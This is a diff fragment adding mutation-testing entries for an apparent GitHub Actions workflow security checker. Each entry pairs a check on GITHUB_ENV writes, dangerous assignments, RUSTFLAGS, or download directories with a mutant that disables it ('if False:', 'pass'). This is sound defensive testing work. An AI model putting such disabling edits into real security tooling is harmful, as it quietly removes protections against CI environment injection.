+    ('matrix complex message dropped', 'for key in matrix_complex_keys(raw, ctx):', 'for key in []:'),
+    ('dangerous assignment in a run step allowed', 'if dangerous_assign(name, value):\n            return f"an assignment to', 'if False:\n            return f"an assignment to'),
+    ('GITHUB_ENV copied into a variable allowed', 'if GITHUB_ENV_RE.search(value):\n            return "a copy', 'if False:\n            return "a copy'),
+    ('GITHUB_ENV here-document allowed', 'if to_env and scan.heredocs:', 'if False:'),
+    ('export of a dangerous name allowed', 'if m and dangerous_assign(m.group(1), a[m.end():]):', 'if False:'),
+    ('GITHUB_ENV written by another command allowed', 'return f"`{word}` writing GITHUB_ENV"', 'pass'),
+    ('echo -e to GITHUB_ENV allowed', 'if word == "echo" and any(re.fullmatch(r"-[a-zA-Z]*e[a-zA-Z]*", a) for a, _l in args):', 'if False:'),
+    ('GITHUB_ENV line with a computed name allowed', 'if seg.startswith(("$", "`")):', 'if False:'),
+    ('GITHUB_ENV dangerous name allowed', 'if m and dangerous_assign(m.group(1), m.group(2)):', 'if False:'),
+    ('GITHUB_ENV printf format with two names allowed', 'vals[0].count("=") > 1', 'False'),
+    ('env write check skipped', 'if not problem and not reason:\n            env_bad', 'if False:\n            env_bad'),
+    ('env of a uses step not checked', 'check_env_keys(step.get("env"), name, where, rep)\n    run = step.get("run")', 'run = step.get("run")'),
+    ('dangerous name never matches', 'if DANGEROUS_ASSIGN_RE.fullmatch(name):\n        return not', 'if False:\n        return not'),
+    ('RUSTFLAGS value not read', 'return RUSTFLAGS_NAME_RE.fullmatch(name) is not None and (value is None or RUSTFLAGS_BAD_RE.search(value) is not None)', 'return False'),
+    ('Android exemption of any value', 'return not (ANDROID_ENV_RE.fullmatch(name) and value is not None and ANDROID_VALUE_RE.fullmatch(value))', 'return not ANDROID_ENV_RE.fullmatch(name)'),
+    ('Android exemption of any name', 'return not (ANDROID_ENV_RE.fullmatch(name) and value is not None and ANDROID_VALUE_RE.fullmatch(value))', 'return not (value is not None and ANDROID_VALUE_RE.fullmatch(value))'),
+    ('env and with values not read as words', 'words = [str(w) for w in facts.get("words", [])] + step_value_words(step)', 'words = [str(w) for w in facts.get("words", [])]'),
+    ('bare glob over a download directory allowed', 'if bare_glob(piece) and fetch_dir_of(piece) in ctx.fetch_dirs:', 'if False:'),
+    ('ls over a download directory allowed', 'if d in ctx.fetch_dirs:', 'if False:'),
+    ('download directory on GITHUB_PATH allowed', 'if fetch_dir_of(str(arg) + "/_") in ctx.fetch_dirs:', 'if False:'),
+    ('download directory not remembered', 'ctx.fetch_dirs.add(fetch_dir_of(str(out)))', 'pass'),
+    ('self-made names not carried to later steps', 'ctx.made.update(facts.get("env_names", ()))  # type: ignore[arg-type]', 'pass'),
 )
 
 
